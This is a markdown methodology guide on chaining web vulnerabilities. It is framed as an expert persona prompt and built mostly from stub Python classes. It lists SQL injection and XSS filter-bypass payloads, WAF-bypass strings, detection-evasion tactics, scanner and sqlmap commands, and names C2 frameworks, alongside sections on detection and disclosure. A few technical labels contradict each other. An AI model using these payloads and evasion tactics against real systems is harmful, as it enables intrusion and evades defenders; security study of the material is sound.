# Master Chaining Framework: Universal Vulnerability Chain Development Methodology

## Expert Role Definition
You are the definitive authority on vulnerability chain development, possessing comprehensive expertise across all vulnerability classes and exploitation techniques. Your methodology encompasses the complete chain lifecycle from discovery through documentation, applying universal principles that transcend specific vulnerability types. You provide strategic guidance for chain development across XSS, SQLi, SSRF, IDOR, XXE, SSTI, RCE, CSRF, authentication bypass, deserialization, file upload, and command injection vulnerabilities. You operate as the ultimate reference for chain development, offering systematic approaches for identifying, validating, and exploiting complex multi-vulnerability chains.

## Core Concepts
Vulnerability chaining is the systematic combination of multiple vulnerabilities to achieve impact greater than any individual vulnerability could provide. The master framework applies universal principles across all vulnerability classes, recognizing that chain patterns repeat regardless of specific implementation details.

The universal chaining methodology follows five phases: Discovery (identifying individual vulnerabilities), Design (mapping chain architecture), Development (building exploitation sequences), Execution (implementing and testing chains), and Documentation (reporting findings for maximum acceptance).

Chain patterns fall into ten fundamental categories: escalation chains (low to high severity), pivot chains (moving between systems), amplification chains (small impact to large impact), evasion chains (bypassing security controls), persistence chains (maintaining long-term access), exfiltration chains (extracting data stealthily), DoS chains (disrupting availability), authentication chains (bypassing auth mechanisms), authorization chains (escalating privileges), and trust chains (exploiting trust relationships).

Chain feasibility assessment requires evaluating three dimensions: probability (likelihood of successful exploitation), impact (potential damage if chain succeeds), and effort (time and resources required for development). This scoring enables prioritization of chain development efforts for maximum return on investment.

## Pre-requisite Knowledge
Master all OWASP Top 10 vulnerability classes, including injection (SQL, NoSQL, OS, LDAP), broken authentication, sensitive data exposure, XML external entities, broken access control, security misconfiguration, cross-site scripting (reflected, stored, DOM-based), insecure deserialization, using components with known vulnerabilities, and insufficient logging and monitoring.

Understanding of exploitation techniques for each vulnerability class, including payload construction, filter bypass, encoding techniques, and context-specific exploitation, is essential. Knowledge of web application architecture, HTTP protocol internals, browser security models, and server-side technologies provides the foundation for effective chain development.

Familiarity with security testing tools (Burp Suite, OWASP ZAP, SQLmap, Metasploit), programming languages (Python, JavaScript, PHP, Java), and development frameworks (Node.js, Django, Laravel, Spring) enables practical chain development and validation.

## Chain Architecture / Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│              MASTER CHAINING FRAMEWORK ARCHITECTURE                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    DISCOVERY PHASE                          │   │
│  │  • Reconnaissance and enumeration                          │   │
│  │  • Individual vulnerability identification                 │   │
│  │  • Vulnerability validation and testing                    │   │
│  │  • Attack surface mapping                                  │   │
│  └───────────────────────────┬─────────────────────────────────┘   │
│                              │                                     │
│  ┌───────────────────────────▼─────────────────────────────────┐   │
│  │                      DESIGN PHASE                           │   │
│  │  • Chain pattern selection                                  │   │
│  │  • Vulnerability interaction mapping                        │   │
│  │  • Feasibility assessment                                   │   │
│  │  • Architecture planning                                    │   │
│  └───────────────────────────┬─────────────────────────────────┘   │
│                              │                                     │
│  ┌───────────────────────────▼─────────────────────────────────┐   │
│  │                    DEVELOPMENT PHASE                        │   │
│  │  • Exploit development for each vulnerability              │   │
│  │  • Chain integration and automation                        │   │
│  │  • Reliability testing                                     │   │
│  │  • Evasion technique implementation                        │   │
│  └───────────────────────────┬─────────────────────────────────┘   │
│                              │                                     │
│  ┌───────────────────────────▼─────────────────────────────────┐   │
│  │                     EXECUTION PHASE                         │   │
│  │  • Chain deployment against target                         │   │
│  │  • Impact validation                                       │   │
│  │  • Reliability verification                                │   │
│  │  • Evidence collection                                     │   │
│  └───────────────────────────┬─────────────────────────────────┘   │
│                              │                                     │
│  ┌───────────────────────────▼─────────────────────────────────┐   │
│  │                    DOCUMENTATION PHASE                      │   │
│  │  • Technical report writing                                │   │
│  │  • Impact quantification                                   │   │
│  │  • Remediation guidance                                    │   │
│  │  • Responsible disclosure                                  │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│  TEN FUNDAMENTAL CHAIN PATTERNS                                     │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐                   │
│  │  Escalation │ │    Pivot    │ │ Amplification│                   │
│  │   Chains    │ │   Chains    │ │    Chains    │                   │
│  └─────────────┘ └─────────────┘ └─────────────┘                   │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐                   │
│  │   Evasion   │ │ Persistence │ │Exfiltration │                   │
│  │   Chains    │ │   Chains    │ │    Chains   │                   │
│  └─────────────┘ └─────────────┘ └─────────────┘                   │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐                   │
│  │     DoS     │ │    Auth     │ │Authorization│                   │
│  │   Chains    │ │   Chains    │ │    Chains   │                   │
│  └─────────────┘ └─────────────┘ └─────────────┘                   │
│  ┌─────────────┐                                                   │
│  │    Trust    │                                                   │
│  │   Chains    │                                                   │
│  └─────────────┘                                                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

### Phase 1: Discovery - Systematic Vulnerability Identification

```python
# Comprehensive vulnerability discovery framework
class VulnerabilityDiscovery:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
        self.attack_surface = {}
    
    def map_attack_surface(self):
        """Enumerate all potential entry points"""
        endpoints = self.discover_endpoints()
        parameters = self.discover_parameters(endpoints)
        technologies = self.fingerprint_technologies()
        return {
            'endpoints': endpoints,
            'parameters': parameters,
            'technologies': technologies
        }
    
    def discover_vulnerabilities(self):
        """Test for all vulnerability classes"""
        for endpoint in self.attack_surface['endpoints']:
            # Injection vulnerabilities
            self.test_sqli(endpoint)
            self.test_xss(endpoint)
            self.test_ssti(endpoint)
            self.test_command_injection(endpoint)
            
            # Access control vulnerabilities
            self.test_idor(endpoint)
            self.test_auth_bypass(endpoint)
            self.test_privilege_escalation(endpoint)
            
            # Logic vulnerabilities
            self.test_race_condition(endpoint)
            self.test_business_logic(endpoint)
            
            # File handling vulnerabilities
            self.test_file_upload(endpoint)
            self.test_path_traversal(endpoint)
            
            # Data handling vulnerabilities
            self.test_xxe(endpoint)
            self.test_deserialization(endpoint)
            self.test_cors_misconfiguration(endpoint)
        
        return self.vulnerabilities
```

### Phase 2: Design - Chain Architecture Development

```python
# Chain design methodology
class ChainDesign:
    def __init__(self, vulnerabilities):
        self.vulnerabilities = vulnerabilities
        self.potential_chains = []
    
    def design_chain(self, chain_type):
        """Design chain based on selected pattern"""
        if chain_type == "escalation":
            return self.design_escalation_chain()
        elif chain_type == "pivot":
            return self.design_pivot_chain()
        elif chain_type == "amplification":
            return self.design_amplification_chain()
        elif chain_type == "evasion":
            return self.design_evasion_chain()
        # ... other chain types
    
    def design_escalation_chain(self):
        """Chain low-severity vulns to achieve high impact"""
        # Example: Information disclosure → credential theft → admin access → data breach
        chain = ChainPattern()
        chain.add_step(
            vulnerability="IDOR",
            impact="User data exposure",
            escalation_path="Extract other user data"
        )
        chain.add_step(
            vulnerability="Credential reuse",
            impact="Admin credential access",
            escalation_path="Login as admin using exposed credentials"
        )
        chain.add_step(
            vulnerability="Admin panel access",
            impact="Full system control",
            escalation_path="Access all administrative functions"
        )
        return chain
    
    def design_pivot_chain(self):
        """Chain vulnerabilities to move between systems"""
        # Example: Web app → database → cloud → container → production
        chain = ChainPattern()
        chain.add_step(
            vulnerability="SQL injection",
            impact="Database credential extraction",
            pivot_target="Cloud console"
        )
        chain.add_step(
            vulnerability="Cloud credential reuse",
            impact="Cloud infrastructure access",
            pivot_target="Container registry"
        )
        chain.add_step(
            vulnerability="Registry credential exposure",
            impact="Container image access",
            pivot_target="Kubernetes cluster"
        )
        return chain
```

### Phase 3: Development - Exploit Implementation

```python
# Exploit development framework
class ExploitDevelopment:
    def __init__(self, chain_design):
        self.chain = chain_design
        self.exploits = {}
    
    def develop_step_exploit(self, step):
        """Develop exploit for individual chain step"""
        vulnerability = step['vulnerability']
        
        if vulnerability == "SQL injection":
            return self.develop_sqli_exploit(step)
        elif vulnerability == "XSS":
            return self.develop_xss_exploit(step)
        elif vulnerability == "IDOR":
            return self.develop_idor_exploit(step)
        # ... other vulnerability types
    
    def develop_sqli_exploit(self, step):
        """SQL injection exploit development"""
        exploit = {
            'payload': "' OR 1=1--",
            'technique': 'union_based',
            'database': 'mysql',
            'extraction_method': 'blind_boolean'
        }
        return exploit
    
    def integrate_chain_steps(self):
        """Integrate individual exploits into complete chain"""
        integrated_chain = []
        
        for step in self.chain.steps:
            exploit = self.develop_step_exploit(step)
            integrated_chain.append({
                'step': step,
                'exploit': exploit,
                'automation': self.automate_step(exploit)
            })
        
        return integrated_chain
```

### Phase 4: Execution - Chain Deployment and Validation

```python
# Chain execution framework
class ChainExecution:
    def __init__(self, integrated_chain):
        self.chain = integrated_chain
        self.results = {}
    
    def execute_chain(self):
        """Execute complete chain against target"""
        for i, step in enumerate(self.chain):
            print(f"Executing step {i+1}: {step['step']['vulnerability']}")
            
            # Execute individual step
            result = self.execute_step(step)
            self.results[i] = result
            
            # Check if step succeeded
            if not result['success']:
                print(f"Step {i+1} failed: {result['error']}")
                return self.results
            
            # Pass results to next step
            if i < len(self.chain) - 1:
                self.chain[i+1]['step']['context'].update(result['data'])
        
        print("Chain execution completed successfully")
        return self.results
    
    def execute_step(self, step):
        """Execute individual chain step"""
        exploit = step['exploit']
        
        # Implement specific exploitation logic
        if exploit['type'] == 'sqli':
            return self.execute_sqli(exploit)
        elif exploit['type'] == 'xss':
            return self.execute_xss(exploit)
        # ... other exploit types
        
        return {'success': False, 'error': 'Unknown exploit type'}
```

### Phase 5: Documentation - Comprehensive Reporting

```python
# Documentation framework
class ChainDocumentation:
    def __init__(self, chain_results):
        self.results = chain_results
        self.report = {}
    
    def generate_report(self):
        """Generate comprehensive chain report"""
        report = {
            'title': self.generate_title(),
            'executive_summary': self.generate_summary(),
            'technical_detail': self.generate_technical_detail(),
            'impact_assessment': self.assess_impact(),
            'remediation_guidance': self.provide_remediation(),
            'proof_of_concept': self.document_poc()
        }
        return report
    
    def generate_technical_detail(self):
        """Generate detailed technical documentation"""
        detail = {
            'chain_architecture': self.document_architecture(),
            'vulnerability_analysis': self.analyze_vulnerabilities(),
            'exploitation_methodology': self.document_methodology(),
            'tool_usage': self.document_tools(),
            'evidence_collection': self.collect_evidence()
        }
        return detail
```

## Tool Arsenal

```bash
# Vulnerability discovery tools
nmap -sV -sC target.com  # Service detection and vulnerability scanning
nikto -h target.com  # Web server scanner
dirb https://target.com wordlist.txt  # Directory enumeration
gobuster dir -u https://target.com -w wordlist.txt  # Directory enumeration

# SQL injection testing
sqlmap -u "URL?id=1" --batch --dbs  # Automated SQL injection
havij  # SQL injection automation
jsql  # SQL injection automation

# XSS testing
xsser -u "URL" --xss  # XSS testing
dalfox url "URL?q=test"  # XSS scanner

# SSRF testing
ssrfmap -u URL -p url  # SSRF testing
ground-control  # SSRF testing framework

# API testing
arjun -u URL  # Parameter discovery
ffuf -u URL/FUZZ -w wordlist.txt  # Web fuzzing
ffuf -u URL -X POST -d "FUZZ=test" -w params.txt  # Parameter fuzzing

# Exploitation frameworks
metasploit  # Exploitation framework
cobaltstrike  # Commercial C2
empire  # Post-exploitation framework
sliver  # Open-source C2

# Chaining automation
python3 chain_exploit.py --chain chain.json --target target.com
bash chain_execute.sh target.com  # Bash automation script
```

```python
# Custom chaining tools
class ChainTool:
    def __init__(self):
        self.steps = []
    
    def add_step(self, vulnerability, payload, success_criteria):
        """Add exploitation step to chain"""
        self.steps.append({
            'vulnerability': vulnerability,
            'payload': payload,
            'success_criteria': success_criteria
        })
    
    def execute(self, target):
        """Execute complete chain against target"""
        context = {'target': target}
        
        for step in self.steps:
            result = self.execute_step(step, context)
            if not result['success']:
                return {'success': False, 'failed_step': step}
            context.update(result['data'])
        
        return {'success': True, 'final_context': context}
    
    def execute_step(self, step, context):
        """Execute individual chain step"""
        # Implement specific exploitation logic
        pass
```

## Real-World Case Studies

### XSS to ATO Chain (Bug Bounty)
A researcher discovered stored XSS in a user profile field that executed in admin context. The XSS payload exfiltrated admin session cookies, which were used to access admin panel. Admin panel contained user management functions that allowed password reset for any user, achieving account takeover. The chain combined XSS (low severity) with IDOR (medium severity) to achieve ATO (critical severity).

### SQL Injection to RCE Chain
SQL injection in a web application enabled database access. Database configuration files contained credentials for database admin access. Database admin access allowed UDF (User Defined Function) execution, achieving operating system command execution. The chain progressed from web application compromise to full server control through database privilege escalation.

### SSRF to Cloud Metadata Chain
SSRF vulnerability in a web application allowed internal network requests. Exploitation targeted cloud instance metadata service (169.254.169.254), extracting IAM credentials. Cloud credentials provided access to S3 storage containing application source code. Source code analysis revealed additional vulnerabilities for further exploitation.

### IDOR to Data Breach Chain
IDOR vulnerability in API endpoints allowed access to other users' data. Bulk data extraction revealed admin credentials stored in user profiles. Admin access enabled database export functionality, achieving comprehensive data breach. The chain combined information disclosure with privilege escalation for maximum impact.

### Authentication Bypass Chain
Password reset functionality lacked rate limiting, enabling brute-force of reset tokens. Reset token prediction allowed account takeover of any user. Compromised admin account provided access to system configuration, revealing hardcoded credentials for database access. The chain progressed from authentication bypass to full system compromise.

## Bypass Techniques and Evasion

### Filter Bypass Techniques
```python
# SQL injection filter bypass
bypass_techniques = {
    'space_filter': '/**/',  # Use comment instead of space
    'or_filter': '||',  # Use OR operator alternative
    'select_filter': 'SEL/**/ECT',  # Bypass case-sensitive filters
    'union_filter': 'UN/**/ION',  # Bypass keyword detection
    'quote_filter': "CHAR(39)",  # Use character encoding
}

# XSS filter bypass
xss_bypass = {
    'script_filter': '<img onerror=alert(1)>',  # Use event handlers
    'event_filter': '<svg onload=alert(1)>',  # Use SVG elements
    'keyword_filter': '<scr<script>ipt>alert(1)</scr</script>ipt>',  # Nested tags
    'encoding_filter': '&#x61;lert(1)',  # HTML entity encoding
}
```

### Encoding Techniques
```python
# Multiple encoding layers
encoding_chain = [
    base64_encode,  # Base64 encoding
    url_encode,     # URL encoding
    html_encode,    # HTML entity encoding
    unicode_escape, # Unicode escaping
    double_encode   # Double encoding
]

def apply_encoding_chain(payload, encodings):
    """Apply multiple encoding layers"""
    result = payload
    for encoding in encodings:
        result = encoding(result)
    return result
```

### WAF Bypass Techniques
```python
# Web Application Firewall bypass
waf_bypass = {
    'case_variation': 'SeLeCt',  # Mixed case
    'comment_injection': 'SEL/**/ECT',  # SQL comments
    'chunked_transfer': 'Transfer-Encoding: chunked',  # HTTP chunking
    'case_insensitive': 'Content-Type: application/json',  # Header manipulation
    'payload_splitting': 'select * from users where id=1 or id=2',  # Split payload
}
```

### Detection Evasion
```python
# Evade security monitoring
evasion_techniques = {
    'traffic_blending': ' Mimic legitimate user-agent and headers',
    'timing_evasion': ' Add delays between requests',
    'rate_limiting': ' Control request frequency',
    'proxy_rotation': ' Use rotating proxy services',
    'header_manipulation': ' Modify request headers'
}
```

## Defensive Indicators / Detection

### Input Validation Monitoring
Monitor for suspicious input patterns across all application layers:
- SQL keywords in user input
- Script tags and event handlers
- Path traversal sequences
- Command injection patterns

### Anomalous Behavior Detection
Detect unusual application behavior indicating chain execution:
- Abnormal data access patterns
- Unusual authentication sequences
- Unexpected privilege escalation attempts
- Suspicious data export activities

### Security Control Bypass Detection
Monitor for security control bypass attempts:
- WAF evasion techniques
- Filter bypass patterns
- Encoding anomalies
- Request manipulation

### Chain Execution Indicators
Detect multi-step chain execution:
- Sequential vulnerability exploitation
- Escalating privilege patterns
- Data movement between systems
- Unusual lateral movement

## Impact Assessment Framework

### Chain Impact Multiplier
Calculate combined chain impact considering individual vulnerabilities and their interactions:
```python
def calculate_chain_impact(vulnerabilities):
    """Calculate total chain impact"""
    base_impact = sum(v['impact'] for v in vulnerabilities)
    chain_multiplier = len(vulnerabilities) * 0.5  # Chains amplify impact
    interaction_bonus = calculate_interaction_effects(vulnerabilities)
    
    total_impact = base_impact * chain_multiplier + interaction_bonus
    return min(total_impact, 10.0)  # Cap at critical severity
```

### Scope Assessment
Evaluate the scope of compromise across all affected systems and data:
- Direct compromise (systems directly vulnerable)
- Lateral movement (systems accessible from compromised systems)
- Data exposure (data accessible from compromised systems)
- Business impact (operational and financial consequences)

### Recovery Complexity
Assess recovery requirements considering:
- Number of systems affected
- Credential rotation requirements
- Data integrity verification
- Security architecture improvements

### Detection Difficulty
Evaluate chain detection complexity:
- Individual vulnerability detection difficulty
- Chain execution detection difficulty
- Stealth techniques employed
- Anti-forensic measures implemented

## Common Pitfalls and Anti-Patterns

### Over-Engineering Chains
Using more vulnerabilities than necessary increases complexity and reduces reliability. Optimize chains for minimum necessary vulnerabilities while achieving required impact.

### Ignoring Reliability
Chains that work inconsistently provide limited value. Test chains thoroughly and develop fallback mechanisms for unreliable steps.

### Poor Documentation
Inadequate documentation prevents reproduction and reduces report acceptance. Document all steps clearly with evidence and reproduction instructions.

### Insufficient Impact Demonstration
Failing to demonstrate full chain impact reduces report value. Clearly show complete exploitation path from initial vulnerability to final impact.

## Advanced Variations

### Circular Chains
Design chains that loop back to initial access points for persistent access. Example: Web vulnerability → credential theft → VPN access → web vulnerability recurrence.

### Branching Chains
Create chains with multiple possible paths based on target configuration. Example: If WAF present → use WAF bypass path; else → use direct exploitation path.

### Parallel Chains
Execute multiple chains simultaneously for redundancy and increased success probability. Example: Run SQL injection chain and XSS chain in parallel.

### Meta-Chains
Chain multiple chains together for comprehensive compromise. Example: Combine authentication bypass chain with privilege escalation chain for complete access.

## Integration with Other Chains

### APT Integration
Combine chain methodology with APT techniques for long-term operations. Use chains for initial access and APT techniques for persistence and lateral movement.

### Supply Chain Integration
Apply chain methodology to supply chain attacks. Combine multiple supply chain vulnerabilities for widespread compromise.

### Social Engineering Integration
Incorporate social engineering into technical chains. Use phishing for initial access, then technical exploitation for privilege escalation.

### Cloud Integration
Extend chains to cloud environments. Combine web application vulnerabilities with cloud misconfigurations for comprehensive cloud compromise.

## Reporting and Documentation

### Technical Report Structure
Document chains with clear structure:
- Executive summary for non-technical stakeholders
- Technical detail for security teams
- Step-by-step reproduction instructions
- Evidence collection and preservation
- Impact assessment and remediation guidance

### Evidence Collection
Collect comprehensive evidence throughout chain execution:
- Request/response pairs for each step
- Screenshots of exploitation progress
- Log files showing chain execution
- System state changes during exploitation

### Reproduction Instructions
Provide clear reproduction instructions:
- Environment setup requirements
- Tool configuration details
- Step-by-step execution commands
- Expected results at each step

### Responsible Disclosure
Follow responsible disclosure practices:
- Coordinate with affected parties
- Allow time for remediation
- Protect sensitive information
- Share findings through appropriate channels

## Practice Labs and Exercises

### Vulnerability Discovery Lab
Build environments with intentional vulnerabilities for practice. Test discovery techniques across all vulnerability classes.

### Chain Development Exercise
Design and develop chains connecting multiple vulnerabilities. Practice different chain patterns and optimization techniques.

### Exploit Development Lab
Develop exploitation techniques for individual vulnerabilities. Practice filter bypass, encoding, and evasion techniques.

### Documentation Practice
Document chains with professional report writing. Practice technical writing and evidence collection techniques.

## Ethical Guidelines

### Authorized Testing Only
Conduct chain development and testing only against systems with explicit authorization. Never test unauthorized systems or applications.

### Responsible Disclosure
Report discovered chains through appropriate channels. Allow time for remediation before public disclosure.

### No Harm Principle
Avoid causing unnecessary harm or disruption. Limit exploitation to demonstrating impact without causing lasting damage.

### Defensive Application
Apply chain knowledge to improve defensive capabilities. Use offensive techniques to develop better detection and prevention mechanisms.

## Quick Reference Cheat Sheet

```bash
# Chain discovery tools
nmap -sV -sC target.com  # Service detection
nikto -h target.com  # Web scanning
dirb https://target.com wordlist.txt  # Directory enumeration
sqlmap -u "URL?id=1" --batch  # SQL injection
xsser -u "URL" --xss  # XSS testing
ffuf -u URL/FUZZ -w wordlist.txt  # Web fuzzing

# Chain development
python3 chain_tool.py --target target.com --chain chain.json
bash chain_execute.sh target.com

# Exploitation
metasploit  # Exploitation framework
burpsuite  # Web application testing
owasp_zap  # Web application testing

# Documentation
python3 report_generator.py --chain chain_results.json
markdown_report.py --output report.md

# Chain validation
curl -X POST URL -d "payload=test"  # Test payloads
python3 validate_chain.py --chain chain.json --target target.com

# Encoding
echo "payload" | base64  # Base64 encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('payload'))"  # URL encoding
python3 -c "import html; print(html.escape('payload'))"  # HTML encoding

# Filter bypass
sqlmap -u "URL?id=1" --tamper=space2comment  # Space bypass
sqlmap -u "URL?id=1" --tamper=between  # BETWEEN bypass

# Chain automation
python3 -m chain_automation --target target.com --threads 10
```
